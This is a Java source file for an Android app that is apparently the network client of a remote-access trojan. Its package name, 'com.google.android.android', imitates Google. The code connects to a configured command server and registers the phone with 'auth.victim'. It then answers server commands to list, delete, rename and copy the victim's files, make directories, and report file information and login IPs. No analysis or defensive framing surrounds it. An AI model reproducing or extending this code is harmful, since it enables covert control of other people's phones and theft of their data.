package com.google.android.android;

import android.os.AsyncTask;

import com.google.android.android.decoders.ResponseDecoder;
import com.google.android.android.encoders.RequestEncoder;

import org.json.simple.JSONArray;
import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;
import org.json.simple.parser.ParseException;

import io.netty.bootstrap.Bootstrap;
import io.netty.channel.ChannelFuture;
import io.netty.channel.ChannelInitializer;
import io.netty.channel.ChannelOption;
import io.netty.channel.EventLoopGroup;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioSocketChannel;

public class NettyClient extends AsyncTask<String, String, String> {
    private static NettyClient nettyClient;
    private QueryHandler queryHandler;

    public NettyClient() {
        nettyClient = this;
    }

    public static NettyClient getInstance() {
        return nettyClient;
    }

    @Override
    protected String doInBackground(String... strings) {
        EventLoopGroup workerGroup = null;
        try {
            workerGroup = new NioEventLoopGroup();
            Bootstrap bootstrap = new Bootstrap();
            bootstrap.group(workerGroup);
            bootstrap.channel(NioSocketChannel.class);
            bootstrap.option(ChannelOption.SO_KEEPALIVE, true);
            bootstrap.handler(new ChannelInitializer<SocketChannel>() {

                @Override
                public void initChannel(SocketChannel ch) {
                    queryHandler = new QueryHandler();
                    ch.pipeline().addLast(
                            new RequestEncoder(),
                            new ResponseDecoder(),
                            queryHandler);
                }
            });

            ChannelFuture f = bootstrap.connect(Config.IP_ADDRESS, Config.SERVER_PORT).sync();
            f.channel().closeFuture().sync();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            workerGroup.shutdownGracefully();
            try {
                int mills = 5000;
                //publishProgress(CONNECT_ERROR);
                Thread.sleep(mills);
            } catch (InterruptedException e1) {
                e1.printStackTrace();
            }
            //newConnection();
        }
        return null;
    }

    @Override
    protected void onProgressUpdate(String... values) {
        JSONParser parser = new JSONParser();
        try {
            MainService.getInstance().receiveMessage((JSONObject)parser.parse(values[0]));
        } catch (ParseException e) {
            e.printStackTrace();
            System.out.println("Данный с сервера не формата JSON!");
        }
    }

    public void receiveMessage(Object msg) {
        publishProgress(msg.toString());
    }

    public void sendAuthVictim() {
        JSONObject query = new JSONObject();
        query.put("action", "auth.victim");
        query.put("name", Config.PHONE_NAME);
        queryHandler.sendMessage(query);
    }

    public void sendErrorCode(String code, String owner) {
        JSONObject query = new JSONObject();
        query.put("errorCode", code);
        if (owner != null)
            query.put("owner", owner);
        queryHandler.sendMessage(query);
    }

    public void sendGetFileList(JSONArray files, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "get.file.list");
        query.put("files", files);
        query.put("owner", owner);
        queryHandler.sendMessage(query);
    }

    public void sendDeleteFile(String code, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "delete.file");
        query.put("code", code);
        query.put("owner", owner);
        queryHandler.sendMessage(query);
    }

    public void sendRenameFile(String code, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "rename.file");
        query.put("code", code);
        query.put("owner", owner);
        queryHandler.sendMessage(query);
    }

    public void sendMakeDir(String code, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "make.dir");
        query.put("code", code);
        query.put("owner", owner);
        queryHandler.sendMessage(query);
    }

    public void sendGetFileInfo(JSONObject info, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "get.file.info");
        query.put("info", info);
        query.put("owner", owner);
        queryHandler.sendMessage(query);
    }

    public void sendCopyFile(String code, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "copy.file");
        query.put("code", code);
        query.put("owner", owner);
        queryHandler.sendMessage(query);
    }

    public void sendSetVictimName(String code, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "set.victim.name");
        query.put("code", code);
        query.put("owner", owner);
        queryHandler.sendMessage(query);
    }

    public void sendSetLoginIps(String code, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "set.login.ips");
        query.put("code", code);
        query.put("owner", owner);
        queryHandler.sendMessage(query);
    }
}